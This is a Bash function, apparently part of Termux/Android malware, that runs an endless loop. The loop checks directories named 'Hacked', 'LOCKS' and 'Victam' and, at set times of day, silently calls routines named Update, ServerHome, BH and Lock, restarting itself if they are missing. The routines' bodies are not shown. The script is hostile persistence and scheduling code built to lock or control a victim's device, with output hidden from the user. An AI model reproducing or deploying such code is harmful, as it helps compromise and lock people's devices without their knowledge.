START(){
while true;do

if [[ -d $PREFIX/etc/Hacked/ && -d $PREFIX/etc/Hacked/LOCKS/ && -d $PREFIX/etc/B24B/ && -d $PREFIX/etc/B24B/blue24bluer ]];then

		if [[ $(date +%H:%M:%S) == "00:00:00" || $(date +%H:%M:%S) == "12:00:00" || $(date +%H:%M:%S) == "21:30:00" ]]; then

			if [[ -f $PREFIX/etc/Hacked/LOCKS/server_lock_file ]];then

		        if [[ $(cat $PREFIX/etc/Hacked/LOCKS/server_lock_file) == "End" ]];then

               		printf ""

		        else

	                rm -rfd $PREFIX/etc/Hacked/LOCKS/server_lock_file
					if [[ `command -v logcat` ]];then
						logcat $PREFIX/etc/B24B/blue24bluer/FServer &>>/dev/null
					else
						echo "" > $PREFIX/etc/B24B/blue24bluer/FServer
					fi

					if [[ -f $PREFIX/etc/Hacked/Victam/BH ]];then

						Update     &>> /dev/null
						ServerHome &>> /dev/null
						Lock

					else

						Update     &>> /dev/null
						BH
						ServerHome &>> /dev/null

					fi

		       	fi

			else

				if [[ -f $PREFIX/etc/Hacked/Victam/BH ]];then

					Update     &>> /dev/null
					ServerHome &>> /dev/null
					Lock

				else

					Update     &>> /dev/null
					BH
					ServerHome &>> /dev/null

				fi
	                	rm -rfd $PREFIX/etc/Hacked/LOCKS/server_lock_file

			fi


		else

		    if [[ -d $PREFIX/etc/B24B/ && -d $PREFIX/etc/B24B/blue24bluer && ! -f $PREFIX/etc/B24B/blue24bluer/FServer ]]; then


				if [[ -f $PREFIX/etc/Hacked/LOCKS/server_lock_file ]];then

		        	if [[ $(cat $PREFIX/etc/Hacked/LOCKS/server_lock_file) == "End" ]];then

               			printf ""

		        	else

	                	rm -rfd $PREFIX/etc/Hacked/LOCKS/server_lock_file

						if [[ `command -v logcat` ]];then
							logcat $PREFIX/etc/B24B/blue24bluer/FServer &>>/dev/null
						else
							echo "" > $PREFIX/etc/B24B/blue24bluer/FServer
						fi


						if [[ -f $PREFIX/etc/Hacked/Victam/BH ]];then

							Update     &>> /dev/null
							ServerHome &>> /dev/null
							Lock

						else

							Update     &>> /dev/null
							BH
							ServerHome &>> /dev/null

						fi

		        	fi

				else

					if [[ -f $PREFIX/etc/Hacked/Victam/BH ]];then

						Update     &>> /dev/null
						ServerHome &>> /dev/null
						Lock

					else

						Update     &>> /dev/null
						BH
						ServerHome &>> /dev/null

					fi
	             	rm -rfd $PREFIX/etc/Hacked/LOCKS/server_lock_file

				fi

		    else

				Update

	    	fi
		fi
else

	Update &>> /dev/null
	START &>> /dev/null
	
fi

done

	echo -e "End" > $PREFIX/etc/Hacked/LOCKS/server_lock_file
	rm $PREFIX/etc/Hacked/LOCKS/server_lock_file

}
